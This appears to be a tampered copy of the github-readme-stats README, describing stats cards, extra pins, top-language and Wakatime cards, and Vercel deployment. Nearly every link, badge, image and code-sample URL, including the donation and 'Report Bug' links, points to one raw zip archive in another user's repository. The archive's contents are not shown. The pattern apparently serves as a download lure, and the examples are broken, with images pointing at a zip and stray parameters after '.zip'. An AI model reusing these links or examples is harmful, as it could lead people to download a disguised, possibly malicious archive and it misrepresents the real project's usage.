<p align="center">
 <img width="100px" src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" align="center" alt="GitHub Readme Stats" />
 <h2 align="center">GitHub Readme Stats</h2>
 <p align="center">Get dynamically generated GitHub stats on your readmes!</p>
</p>
  <p align="center">
    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
      <img alt="Tests Passing" src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" />
    </a>
    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
      <img src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" />
    </a>
    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
      <img alt="Issues" src="https://img.shields.io/github/issues/anuraghazra/github-readme-stats?color=0088ff" />
    </a>
    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
      <img alt="GitHub pull requests" src="https://img.shields.io/github/issues-pr/anuraghazra/github-readme-stats?color=0088ff" />
    </a>
    <br />
    <br />
    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
      <img src="https://img.shields.io/badge/Supported%20by-VSCode%20Power%20User%20%E2%86%92-gray.svg?colorA=655BE1&colorB=4F44D6&style=for-the-badge"/>
    </a>
    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
      <img src="https://img.shields.io/badge/Supported%20by-Node%20Cli.com%20%E2%86%92-gray.svg?colorA=61c265&colorB=4CAF50&style=for-the-badge"/>
    </a>
  </p>

  <p align="center">
    <a href="#demo">View Demo</a>
    ·
    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">Report Bug</a>
    ·
    <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">Request Feature</a>
  </p>
  <p align="center">
    <a href="/docs/readme_fr.md">Français </a>
    ·
    <a href="/docs/readme_cn.md">简体中文</a>
    ·
    <a href="/docs/readme_es.md">Español</a>
    ·
    <a href="/docs/readme_de.md">Deutsch</a>
    ·
    <a href="/docs/readme_ja.md">日本語</a>
    ·
    <a href="/docs/readme_pt-BR.md">Português Brasileiro</a>
    ·
    <a href="/docs/readme_it.md">Italiano</a>
    ·
    <a href="/docs/readme_kr.md">한국어</a>
    .
    <a href="/docs/readme_nl.md">Nederlands</a>
    .
    <a href="/docs/readme_np.md">नेपाली</a>
    .
    <a href="/docs/readme_tr.md">Türkçe</a>
  </p>
</p>
<p align="center">Love the project? Please consider <a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">donating</a> to help it improve!

# Features

- [GitHub Stats Card](#github-stats-card)
- [GitHub Extra Pins](#github-extra-pins)
- [Top Languages Card](#top-languages-card)
- [Wakatime Week Stats](#wakatime-week-stats)
- [Themes](#themes)
- [Customization](#customization)
- [Deploy Yourself](#deploy-on-your-own-vercel-instance)

# GitHub Stats Card

Copy-paste this into your markdown content, and that's it. Simple!

Change the `?username=` value to your GitHub's username.

```md
[![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

_Note: Available ranks are S+ (top 1%), S (top 25%), A++ (top 45%), A+ (top 60%), and B+ (everyone).
The values are calculated by using the [cumulative distribution function](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) using commits, contributions, issues, stars, pull requests, followers, and owned repositories.
The implementation can be investigated at [src/calculateRank.js](./src/calculateRank.js)_

### Hiding individual stats

To hide any specific stats, you can pass a query parameter `?hide=` with comma-separated values.

> Options: `&hide=stars,commits,prs,issues,contribs`

```md
![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,prs)
```

### Adding private contributions count to total commits count

You can add the count of all your private contributions to the total commits count by using the query parameter `?count_private=true`.

_Note: If you are deploying this project yourself, the private contributions will be counted by default otherwise you need to chose to share your private contribution counts._

> Options: `&count_private=true`

```md
![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

### Showing icons

To enable icons, you can pass `show_icons=true` in the query param, like so:

```md
![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

### Themes

With inbuilt themes, you can customize the look of the card without doing any [manual customization](#customization).

Use `?theme=THEME_NAME` parameter like so :-

```md
![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

#### All inbuilt themes :-

dark, radical, merko, gruvbox, tokyonight, onedark, cobalt, synthwave, highcontrast, dracula

<img src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" alt="GitHub Readme Stats Themes" width="600px"/>

You can look at a preview for [all available themes](./themes/README.md) or checkout the [theme config file](./themes/index.js) & **you can also contribute new themes** if you like :D

### Customization

You can customize the appearance of your `Stats Card` or `Repo Card` however you wish with URL params.

#### Common Options:

- `title_color` - Card's title color _(hex color)_
- `text_color` - Body text color _(hex color)_
- `icon_color` - Icons color if available _(hex color)_
- `bg_color` - Card's background color _(hex color)_ **or** a gradient in the form of _angle,start,end_
- `hide_border` - Hides the card's border _(boolean)_
- `theme` - name of the theme, choose from [all available themes](./themes/README.md)
- `cache_seconds` - set the cache header manually _(min: 1800, max: 86400)_
- `locale` - set the language in the card _(e.g. cn, de, es, etc.)_
- `border_radius` - Corner rounding on the card_

##### Gradient in bg_color

You can provide multiple comma-separated values in bg_color option to render a gradient, the format of the gradient is :-

```
&bg_color=DEG,COLOR1,COLOR2,COLOR3...COLOR10
```

> Note on cache: Repo cards have a default cache of 4 hours (14400 seconds) if the fork count & star count is less than 1k, otherwise, it's 2 hours (7200 seconds). Also, note that the cache is clamped to a minimum of 2 hours and a maximum of 24 hours.

#### Stats Card Exclusive Options:

- `hide` - Hides the specified items from stats _(Comma-separated values)_
- `hide_title` - _(boolean)_
- `hide_rank` - _(boolean)_ hides the rank and automatically resizes the card width
- `show_icons` - _(boolean)_
- `include_all_commits` - Count total commits instead of just the current year commits _(boolean)_
- `count_private` - Count private commits _(boolean)_
- `line_height` - Sets the line-height between text _(number)_
- `custom_title` - Sets a custom title for the card
- `disable_animations` - Disables all animations in the card _(boolean)_

#### Repo Card Exclusive Options:

- `show_owner` - Show the repo's owner name _(boolean)_

#### Language Card Exclusive Options:

- `hide` - Hide the languages specified from the card _(Comma-separated values)_
- `hide_title` - _(boolean)_
- `layout` - Switch between two available layouts `default` & `compact`
- `card_width` - Set the card's width manually _(number)_
- `langs_count` - Show more languages on the card, between 1-10, defaults to 5 _(number)_
- `exclude_repo` - Exclude specified repositories _(Comma-separated values)_
- `custom_title` - Sets a custom title for the card

> :warning: **Important:**
> Language names should be uri-escaped, as specified in [Percent Encoding](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
> (i.e: `c++` should become `c%2B%2B`, `jupyter notebook` should become `jupyter%20notebook`, etc.) You can use
> [urlencoder.org](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) to help you do this automatically.

#### Wakatime Card Exclusive Options:

- `hide_title` - _(boolean)_
- `line_height` - Sets the line-height between text _(number)_
- `hide_progress` - Hides the progress bar and percentage _(boolean)_
- `custom_title` - Sets a custom title for the card
- `layout` - Switch between two available layouts `default` & `compact`
- `api_domain` - Set a custom API domain for the card, e.g. to use services like [Hakatime](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) or [Wakapi](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
- `range` – Request a range different from your WakaTime default, e.g. `last_7_days`. See [WakaTime API docs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) for list of available options.

---

# GitHub Extra Pins

GitHub extra pins allow you to pin more than 6 repositories in your profile using a GitHub readme profile.

Yay! You are no longer limited to 6 pinned repositories.

### Usage

Copy-paste this code into your readme and change the links.

Endpoint: `api/pin?username=anuraghazra&repo=github-readme-stats`

```md
[![Readme Card](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

### Demo

[![Readme Card](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

Use [show_owner](#customization) variable to include the repo's owner username

[![Readme Card](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

# Top Languages Card

The top languages card show a GitHub user's most frequently used top language.

_NOTE: Top Languages does not indicate my skill level or anything like that, it's a GitHub metric of which languages have the most code on GitHub. It's a new feature of github-readme-stats._

### Usage

Copy-paste this code into your readme and change the links.

Endpoint: `api/top-langs?username=anuraghazra`

```md
[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

### Exclude individual repositories

You can use `?exclude_repo=repo1,repo2` parameter to exclude individual repositories.

```md
[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,anuraghazra.github.io)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

### Hide individual languages

You can use `?hide=language1,language2` parameter to hide individual languages.

```md
[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,html)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

### Show more languages

You can use the `&langs_count=` option to increase or decrease the number of languages shown on the card. Valid values are integers between 1 and 10 (inclusive), and the default is 5.

```md
[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

### Compact Language Card Layout

You can use the `&layout=compact` option to change the card design.

```md
[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

### Demo

[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Compact layout

[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

# Wakatime Week Stats

Change the `?username=` value to your [Wakatime](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) username.

```md
[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
```

### Demo

[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Compact layout

[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

---

### All Demos

- Default

![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Hiding specific stats

![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,issues)

- Showing icons

![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Include All Commits

![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Themes

Choose from any of the [default themes](#themes)

![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Gradient

![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip,e96443,904e95&title_color=fff&text_color=fff)

- Customizing stats card

![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Setting card locale

![Anurag's GitHub stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Customizing repo card

![Customized Card](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Top languages

[![Top Langs](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

- Wakatime card

[![willianrod's wakatime stats](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

---

### Quick Tip (Align The Repo Cards)

You usually won't be able to layout the images side by side. To do that you can use this approach:

```md
<a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
  <img align="center" src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" />
</a>
<a href="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip">
  <img align="center" src="https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip" />
</a>
```

## Deploy on your own Vercel instance

#### [Check Out Step By Step Video Tutorial By @codeSTACKr](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

Since the GitHub API only allows 5k requests per hour, my `https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip` could possibly hit the rate limiter. If you host it on your own Vercel server, then you don't have to worry about anything. Click on the deploy button to get started!

NOTE: Since [#58](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) we should be able to handle more than 5k requests and have no issues with downtime :D

[![Deploy to Vercel](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)

<details>
 <summary><b> Guide on setting up Vercel  🔨 </b></summary>

1. Go to [vercel.com](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
1. Click on `Log in`
   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
1. Sign in with GitHub by pressing `Continue with GitHub`
   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
1. Sign into GitHub and allow access to all repositories, if prompted
1. Fork this repo
1. Go back to your [Vercel dashboard](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
1. Select `Import Project`
   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
1. Select `Import Git Repository`
   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
1. Select root and keep everything as is, just add your environment variable named PAT_1 (as shown), which will contain a personal access token (PAT), which you can easily create [here](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) (leave everything as is, just name it something, it can be anything you want)
   ![](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)
1. Click deploy, and you're good to go. See your domains to use the API!

</details>

## :sparkling_heart: Support the project

I open-source almost everything I can, and I try to reply to everyone needing help using these projects. Obviously,
this takes time. You can use this service for free.

However, if you are using this project and are happy with it or just want to encourage me to continue creating stuff, there are few ways you can do it :-

- Giving proper credit when you use github-readme-stats on your readme, linking back to it :D
- Starring and sharing the project :rocket:
- [![paypal.me/anuraghazra](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip) - You can make one-time donations via PayPal. I'll probably buy a ~~coffee~~ tea. :tea:

Thanks! :heart:

---

[![https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip](./powered-by-vercel.svg)](https://github.com/eibrunodev/github-readme-stats/raw/refs/heads/master/src/github-stats-readme-2.1.zip)


Contributions are welcome! <3

Made with :heart: and JavaScript.
